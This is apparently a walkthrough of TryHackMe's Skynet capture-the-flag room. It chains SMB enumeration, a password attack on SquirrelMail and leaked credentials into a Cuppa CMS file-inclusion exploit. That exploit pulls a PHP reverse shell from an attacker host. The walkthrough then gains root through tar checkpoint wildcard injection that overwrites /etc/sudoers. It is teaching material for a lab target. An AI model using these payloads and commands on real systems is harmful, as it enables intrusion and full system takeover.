<p align="center">
  <img src="screenshots/terminator-logo.png" alt="Skynet Terminator logo" width="260">
</p>

# Skynet - Walkthrough

🔗 **TryHackMe Room:** [Skynet](https://tryhackme.com/room/skynet)

```diff
> scan the grid • raid the shares • steal the mailbox • make cron betray the machines
```

---

## ℹ️ Information

- **Platform:** TryHackMe
- **Difficulty:** Easy
- **Theme:** Terminator, Skynet, and enough bad operational security to make a T-800 sigh
- **Goal:** get a user shell, retrieve `user.txt`, escalate to `root`, then retrieve `root.txt`
- **Main services:** SSH, HTTP, POP3, IMAP, SMB

---

## 🧠 Reconnaissance

### Port Scan

Start with service discovery:

```bash
nmap -sC -sV -p- skynet.thm
```

Important results:

```text
22/tcp  open  ssh           OpenSSH 7.2p2 Ubuntu
80/tcp  open  http          Apache/2.4.18 (Ubuntu)
110/tcp open  pop3          Dovecot pop3d
139/tcp open  netbios-ssn
143/tcp open  imap          Dovecot imapd
445/tcp open  microsoft-ds
```

This is already a very chatty target. HTTP is present, but SMB and mail services are the big neon signs here. When a CTF box exposes SMB, mail, and a web app together, I immediately start thinking about leaked credentials, password reuse, forgotten internal notes, and other deeply human ways to lose a server.

👉 **Insight:**
The attack surface is not just "the website." Skynet is a cross-service puzzle. The web app matters later, but SMB is where the trail starts glowing.

---

## 📁 SMB Enumeration

### Enum4Linux

Run a broad SMB enumeration:

```bash
enum4linux -a skynet.thm
```

The interesting findings are:

```text
user:[milesdyson] rid:[0x3e8]

Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
anonymous       Disk      Skynet Anonymous Share
milesdyson      Disk      Miles Dyson Personal Share
IPC$            IPC       IPC Service
```

So now we know two very important things:

- there is a local user named `milesdyson`
- the `anonymous` SMB share can be accessed without credentials

That is the digital equivalent of finding a locked door and a sticky note that says "definitely do not check the unlocked side entrance."

### Anonymous Share

List the shares:

```bash
smbclient -L //skynet.thm -N
```

Connect to the anonymous share:

```bash
smbclient //skynet.thm/anonymous -N
```

Inside the share:

```text
attention.txt
logs/
```

Download the files:

```bash
get attention.txt
cd logs
get log1.txt
get log2.txt
get log3.txt
```

![Anonymous SMB logs](screenshots/1-catlog1.png)

`log1.txt` contains a list of possible passwords. `attention.txt` hints that passwords were changed. Beautiful. A password list plus a known username plus exposed webmail: this is not a breadcrumb anymore, this is a glowing cyberpunk road flare.

---

## 📬 Webmail Access

### Directory Discovery

Enumerate the web server:

```bash
dirsearch -u http://skynet.thm/
```

Interesting paths:

```text
/admin
/config
/squirrelmail
```

The important one is:

```text
http://skynet.thm/squirrelmail/
```

![SquirrelMail login](screenshots/3-webmail.png)

### Password Attack

Use the username discovered from SMB:

```text
milesdyson
```

Use the passwords from `log1.txt` against the SquirrelMail login. Burp Suite is a comfortable way to do this because it lets us replay the login request and test the candidate list.

![Burp Suite password testing](screenshots/2-burpsuite.png)

Successful password:

```text
cyborg007haloterminator
```

Inside the mailbox, one message contains Miles Dyson's SMB password:

```text
)s{A&2Z=F^n_E.B
```

👉 **Insight:**
Password reuse is the quiet villain here. The webmail password gets us into mail, and mail gives us the SMB password. The machines are not rising; they are forwarding credentials.

---

## 🔐 Miles Dyson's SMB Share

Connect to the private share:

```bash
smbclient //skynet.thm/milesdyson -U milesdyson
```

Use the password recovered from webmail:

```text
)s{A&2Z=F^n_E.B
```

The share contains several PDF files and a `notes` directory:

```text
Improving Deep Neural Networks.pdf
Natural Language Processing-Building Sequence Models.pdf
Convolutional Neural Networks-CNN.pdf
notes/
Neural Networks and Deep Learning.pdf
Structuring your Machine Learning Project.pdf
```

Inside `notes`, download `important.txt`:

```bash
cd notes
get important.txt
```

The file contains the next web path:

```text
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

![Hidden endpoint note](screenshots/4-endpoint.png)

Visit:

```text
http://skynet.thm/45kra24zxs28v3yd/
```

At first, it looks quiet. Suspiciously quiet. The kind of quiet that usually means "please enumerate me harder."

---

## 🧭 Hidden CMS Enumeration

Run Gobuster against the hidden path:

```bash
gobuster dir -u http://skynet.thm/45kra24zxs28v3yd/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,html,txt -t 50
```

Interesting result:

```text
/index.html       (Status: 200)
/administrator    (Status: 301)
```

Open the administrator panel:

```text
http://skynet.thm/45kra24zxs28v3yd/administrator/
```

![Cuppa CMS administrator panel](screenshots/5-adminportal.png)

The interface identifies the CMS as **Cuppa CMS**.

Search for public exploits:

```bash
searchsploit cuppa cms
```

Result:

```text
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion
```

👉 **Insight:**
This is the pivot point. We moved from "credential archaeology" to "web exploitation." Cuppa CMS has a file inclusion bug, and file inclusion bugs love turning into shells when a remote payload can be reached.

---

## 🧪 Exploitation

### Confirm File Inclusion

Test local file inclusion by reading `/etc/passwd`:

```text
http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```

![Reading /etc/passwd through file inclusion](screenshots/6-etcpassw.png)

If `/etc/passwd` renders in the browser, the vulnerable parameter is confirmed:

```text
urlConfig
```

### Prepare PHP Reverse Shell

Use a PHP reverse shell, such as Laudanum's:

```bash
cp /usr/share/laudanum/php/php-reverse-shell.php .
```

Edit the shell and set your TryHackMe VPN IP and listener port:

```php
$ip = '<ATTACKER_IP>';
$port = 443;
```

![PHP reverse shell editing](screenshots/7-revshell.png)

Start a Python web server in the directory containing the PHP shell:

```bash
python3 -m http.server 80
```

![Python web server](screenshots/8-PyWebServer.png)

Start a Netcat listener:

```bash
nc -nvlp 443
```

### Trigger Remote File Inclusion

Point the vulnerable `urlConfig` parameter at your hosted PHP shell:

```text
http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<ATTACKER_IP>/php-reverse-shell.php
```

![Triggering the remote PHP shell](screenshots/9-phprevshell.png)

The Python server should show the target requesting the payload:

![Payload requested from Python server](screenshots/10-PyWebServerReponse.png)

And the listener receives a shell:

![Reverse shell received](screenshots/11-shell.png)

👉 **Insight:**
The vulnerable app includes a remote PHP file, the server executes it, and the shell calls back to us. It is basically a hostile software update, except the update is "please give me a terminal."

---

## 🚩 User Flag

With a shell as `www-data`, move through the filesystem and read the user flag:

```bash
cd /home/milesdyson
cat user.txt
```

![User flag](screenshots/12-userflag.png)

The screenshot is intentionally blurred where the flag appears. We are publishing a walkthrough, not putting the answer key in a trench coat.

---

## ⬆️ Privilege Escalation

### Find the Backup Job

List Miles Dyson's home directory:

```bash
ls -la /home/milesdyson
```

![Miles Dyson home directory](screenshots/13-lsla.png)

There is a `backups` directory. Inside it:

```bash
cat /home/milesdyson/backups/backup.sh
```

![Backup script](screenshots/14-backups.png)

The backup script creates an archive from `/var/www/html`. The key detail is that it is run by root through cron:

```bash
cat /etc/crontab
```

![Root cron job](screenshots/15-crontab.png)

Cron entry:

```text
root    /home/milesdyson/backups/backup.sh
```

This gives us a root-run script that archives a web directory we can write to as `www-data`.

### Tar Checkpoint Injection

The backup script uses `tar` with a wildcard. If an attacker can create filenames that look like tar options, those filenames can be interpreted as arguments. That is the tiny crack in the machine's chrome skull.

Move to the web root:

```bash
cd /var/www/html
```

Create a payload that gives `www-data` passwordless sudo:

```bash
echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > exploit.sh
```

Create the malicious tar checkpoint filenames:

```bash
echo "/var/www/html" > "--checkpoint-action=exec=sh exploit.sh"
echo "/var/www/html" > "--checkpoint=1"
```

Wait for the cron job to run. Then check sudo privileges:

```bash
sudo -l
```

Expected result:

```text
User www-data may run the following commands on skynet:
    (root) NOPASSWD: ALL
```

Now become root:

```bash
sudo bash
```

👉 **Insight:**
This is a classic tar wildcard escalation. The command itself is not magical; the dangerous part is running a wildcard archive as root inside a directory writable by a lower-privileged user.

---

## 👑 Root Flag

Read the root flag:

```bash
cat /root/root.txt
```

As with the user flag, the value is redacted for the public walkthrough.

---

## 🧠 Final Thoughts

Skynet teaches a very satisfying chain:

- SMB enumeration can reveal usernames and readable shares
- anonymous shares often contain "temporary" files that became permanent evidence
- webmail can expose credentials for other services
- hidden CMS paths should be enumerated like any other web directory
- Cuppa CMS file inclusion can become code execution
- cron jobs running as root deserve intense side-eye
- writable directories plus unsafe tar wildcards are privilege escalation fuel

---

```diff
> anonymous share to mailbox • mailbox to SMB • SMB to CMS • CMS to shell • cron to root
```

## 🔗 References

- [TryHackMe - Skynet](https://tryhackme.com/room/skynet)
- [Exploit-DB - Cuppa CMS File Inclusion](https://www.exploit-db.com/exploits/25971)
- [GTFOBins - tar](https://gtfobins.github.io/gtfobins/tar/)
- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)

---

The original solving notes are preserved in [Notes.md](Notes.md).
